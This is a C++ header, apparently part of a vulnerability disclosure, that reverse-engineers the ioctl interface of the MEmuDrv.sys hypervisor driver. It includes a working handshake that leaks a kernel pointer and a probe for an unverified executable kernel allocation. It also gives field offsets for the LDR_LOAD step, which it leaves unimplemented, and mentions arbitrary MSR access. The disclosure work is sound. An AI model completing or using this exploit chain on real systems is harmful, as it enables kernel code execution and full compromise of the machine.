// memudrv.h — MEmuDrv.sys (MEmu Hypervisor Support Driver) user-mode interface
//
// reversed from 5.1.34.121010 x64 — a VirtualBox SUPDrv fork with the R0
// hardening stripped. SHA256 9E18ED94739AE711585E397A8EA2F7E1B05E00BD23F57FBB7606C4498192C5E0
//
// devices: \\.\MEmuDrv  and  \\.\MEmuDrvU  (the VBox "unrestricted" sibling)
// access:  plain IoCreateDevice, default WDM ACL -> admin/SYSTEM
// encoding (from the driver's own error strings):
//     CTL_CODE(0x22, (fn) | 0x80, FILE_WRITE_ACCESS, method)
//
// request header (offsets observed in the 5.1.34 build):
//     +0x00 u32 ?            +0x08 u32 cbIn     (must equal per-command expected)
//     +0x04 u32 ?            +0x0C u32 cbOut
//     +0x14 s32 status       (0 = ok)
// in/out fields overlap (single buffer in/out union, VBox SUPREQHDR style).
//
// documented for the disclosure package in ANALYSIS.md. the wrapper class
// implements only the non-destructive ops (cookie handshake + the LDR_OPEN
// fallback probe). the load/execute chain is described in ANALYSIS.md
// section 2 and deliberately not provided.

#pragma once
#include <windows.h>
#include <cstdint>
#include <cstring>

#define MEMU_DEVICE_PATH    L"\\\\.\\MEmuDrv"
#define MEMU_DEVICE_PATH_U  L"\\\\.\\MEmuDrvU"
#define MEMU_COOKIE_MAGIC   "The Magic Word!"
#define MEMU_DRIVER_VERSION 0x2A0000

#define MEMU_CTL(fn, method) CTL_CODE(FILE_DEVICE_UNKNOWN, (fn) | 0x80, FILE_WRITE_ACCESS, method)

enum memu_ioctl : DWORD {
    memu_cookie          = MEMU_CTL(0x01, METHOD_BUFFERED),  // 0x228204
    memu_query_funcs     = MEMU_CTL(0x02, METHOD_BUFFERED),  // 0x228208
    memu_ldr_open        = MEMU_CTL(0x03, METHOD_BUFFERED),  // 0x22820C
    memu_ldr_load        = MEMU_CTL(0x04, METHOD_BUFFERED),  // 0x228210
    memu_ldr_get_symbol  = MEMU_CTL(0x05, METHOD_BUFFERED),  // 0x228214 (+0x18 variant)
    memu_call_hpvr0      = MEMU_CTL(0x07, METHOD_BUFFERED),  // 0x22821C
    memu_low_alloc       = MEMU_CTL(0x08, METHOD_BUFFERED),  // 0x228220
    memu_page_alloc_ex   = MEMU_CTL(0x09, METHOD_BUFFERED),  // 0x228224 (+0x0A)
    memu_page_map_kernel = MEMU_CTL(0x0B, METHOD_BUFFERED),  // 0x22822C
    memu_page_protect    = MEMU_CTL(0x0C, METHOD_BUFFERED),  // 0x228230
    memu_page_lock       = MEMU_CTL(0x0D, METHOD_BUFFERED),  // 0x228234 (+0x0E)
    memu_set_vm_for_fast = MEMU_CTL(0x0F, METHOD_BUFFERED),  // 0x22823C..0x22824C
    memu_call_service    = MEMU_CTL(0x14, METHOD_BUFFERED),  // 0x228250..0x22825C
    memu_logger_settings = MEMU_CTL(0x17, METHOD_BUFFERED),  // 0x228260
    memu_sem_op2         = MEMU_CTL(0x18, METHOD_BUFFERED),  // 0x228264
    memu_sem_op3         = MEMU_CTL(0x19, METHOD_BUFFERED),  // 0x228268
    memu_call_hpvr0_big  = MEMU_CTL(0x1A, METHOD_BUFFERED),  // 0x22826C (+0x1B)
    memu_msr_prober      = MEMU_CTL(0x1C, METHOD_BUFFERED),  // 0x228270..0x22828C (7 variants)
};

enum memu_status : int32_t {
    memu_ok             = 0,
    memu_err_generic    = -1,
    memu_err_busy       = -3,     // cookie magic mismatch
    memu_err_version    = -11,    // cookie version mismatch (0xFFFFFFF5)
    memu_err_not_found  = -14,    // LDR_LOAD "Image not found" (0xFFFFFFF2)
    memu_err_locked     = -10,    // LDR_LOAD "Loader is locked down" (0xFFFFFFF6)
    memu_err_state      = -9,     // LDR_LOAD module state != LDR_OPEN (0xFFFFFFF9)
    memu_err_invalid_ep = -2,     // eEPType / reserved-field failures (0xFFFFFFFE)
};

#pragma pack(push, 1)

// request header — 24 bytes; cbIn/cbOut validated against hardcoded per-command sizes
struct MEMU_REQHDR {
    uint32_t f00;
    uint32_t f04;
    uint32_t cbIn;          // +0x08
    uint32_t cbOut;         // +0x0C
    uint32_t f10;
    int32_t  status;        // +0x14
};

// ---- 0x228204 COOKIE (cbIn = 48, cbOut = 56) --------------------------------
// magic must be "The Magic Word!". uMinVersion must be exactly 0x2A0000
// (check: v <= 0x2A0000 && (v & 0xFFFF0000) == 0x2A0000).
// out overlaps in. note Out.SessionKernel = the kernel SUPDRVSESSION pointer —
// an info leak on the handshake itself.
struct MEMU_COOKIE_REQ {
    MEMU_REQHDR hdr;                                   // 24
    union {
        struct {                                       // in  +0x18
            char     Magic[16];
            uint32_t ReqVersion;
            uint32_t MinVersion;                       // must be 0x2A0000
        };
        struct {                                       // out
            uint32_t OutSessionId;                     // +0x18
            uint32_t OutFlags;                         // +0x1C
            uint32_t SessionVersion;                   // +0x20
            uint32_t DriverVersion;                    // +0x24
            uint32_t FunctionCount;                    // +0x28 (274)
            uint64_t SessionKernel;                    // +0x30 kernel SUPDRVSESSION*
        };
    };
};
static_assert(sizeof(MEMU_COOKIE_REQ) == 56, "cookie size");

// ---- 0x22820C LDR_OPEN (cbIn = 328, cbOut = 40) ------------------------------
// if szFilename does not resolve, the handler falls back to
// RTMemExecAllocTag(cbImageWithTabs) — an executable kernel allocation with
// no file and no verification — and clears the FromFile flag, which disables
// entry-point validation in LDR_LOAD. see ANALYSIS.md 2.1.
struct MEMU_LDROPEN_REQ {
    MEMU_REQHDR hdr;                                   // 24
    union {
        struct {                                       // in  +0x18
            uint32_t cbImageWithTabs;                  // 1 .. 0xFFFFFF
            uint32_t cbImageBits;                      // 1 .. cbImageWithTabs
            char     szName[32];                       // charset-validated
            char     szFilename[260];                  // nonexistent path hits fallback
            uint32_t TailPad;                          // observed cbIn = 328
        };
        struct {                                       // out
            uint64_t hLdrMod;                          // +0x18 module handle
            uint8_t  StateOk;                          // +0x20
            uint8_t  FromFile;                         // +0x21 (0 = exec-alloc fallback)
        };
    };
};
static_assert(sizeof(MEMU_LDROPEN_REQ) == 328, "ldropen size");

// ---- 0x228210 LDR_LOAD (cbIn = cbImageWithTabs + 108, cbOut = 2080) ----------
// documented for completeness; intentionally NOT implemented in the wrapper.
// fields observed in sub_140004B90:
//   +0x18 hLdrModule (from LDR_OPEN)
//   +0x28 pfnServiceReq (entry point; must fall inside the module image)
//   +0x30/+0x38/+0x40 apvReserved[3] (must be zero)
//   +0x50 eEPType (1 or 2)
//   +0x58 offSymbols  +0x5C cSymbols (<= 16384)
//   +0x60 offStrTab   +0x64 cbStrTab
//   +0x68 cbImageWithTabs
//   +0x6C image bytes[cbImageWithTabs]
// the FromFile=0 fallback path skips the SUPR0GetKernelFeatures validation.

// ---- 0x228270.. MSR_PROBER — 7 size/variant codes; arbitrary rdmsr/wrmsr ----

#pragma pack(pop)

class MemuDrv {
public:
    MemuDrv() = default;
    ~MemuDrv() { Close(); }
    MemuDrv(const MemuDrv&) = delete;
    MemuDrv& operator=(const MemuDrv&) = delete;

    bool Open(const wchar_t* path = MEMU_DEVICE_PATH) {
        if (h != INVALID_HANDLE_VALUE) return true;
        h = CreateFileW(path, GENERIC_READ | GENERIC_WRITE, 0,
                        nullptr, OPEN_EXISTING, 0, nullptr);
        return h != INVALID_HANDLE_VALUE;
    }

    void Close() {
        if (h != INVALID_HANDLE_VALUE) { CloseHandle(h); h = INVALID_HANDLE_VALUE; }
    }

    bool IsOpen() const { return h != INVALID_HANDLE_VALUE; }

    // cookie handshake; returns session/driver version, 0 on failure.
    // also returns the leaked kernel session pointer (info-leak evidence).
    uint32_t Handshake(uint64_t* sessionKernel = nullptr) {
        MEMU_COOKIE_REQ r{};
        r.hdr.cbIn  = 48;
        r.hdr.cbOut = 56;
        memcpy(r.Magic, MEMU_COOKIE_MAGIC, sizeof(r.Magic));
        r.ReqVersion = MEMU_DRIVER_VERSION;
        r.MinVersion = MEMU_DRIVER_VERSION;
        if (!Transact(memu_cookie, &r, sizeof(r)))
            return 0;
        if (r.hdr.status != memu_ok)
            return 0;
        if (sessionKernel) *sessionKernel = r.SessionKernel;
        return r.SessionVersion;
    }

    // the vulnerability probe: LDR_OPEN with a nonexistent filename must
    // succeed via the exec-alloc fallback (FromFile == 0) where upstream
    // VBox requires a verified backing file. non-destructive: nothing is
    // loaded or executed; the module is released by closing the session.
    bool LdrOpenFallbackProbe(const char* name, uint64_t& moduleHandle, uint8_t& fromFile) {
        MEMU_LDROPEN_REQ r{};
        r.hdr.cbIn  = sizeof(r);          // 328
        r.hdr.cbOut = 40;
        strncpy_s(r.szName, sizeof(r.szName), name, _TRUNCATE);
        strcpy_s(r.szFilename, sizeof(r.szFilename),
                 "Z:\\__memudrv_probe_no_such_file.sys");   // does not exist
        r.cbImageWithTabs = 0x1000;
        r.cbImageBits     = 0x800;
        if (!Transact(memu_ldr_open, &r, sizeof(r)))
            return false;
        if (r.hdr.status != memu_ok)
            return false;
        moduleHandle = r.hLdrMod;
        fromFile = r.FromFile;
        return true;
    }

    HANDLE Handle() const { return h; }

private:
    bool Transact(DWORD code, void* buf, DWORD len) {
        if (h == INVALID_HANDLE_VALUE) return false;
        DWORD got = 0;
        return DeviceIoControl(h, code, buf, len, buf, len, &got, nullptr) != FALSE;
    }

    HANDLE h = INVALID_HANDLE_VALUE;
};
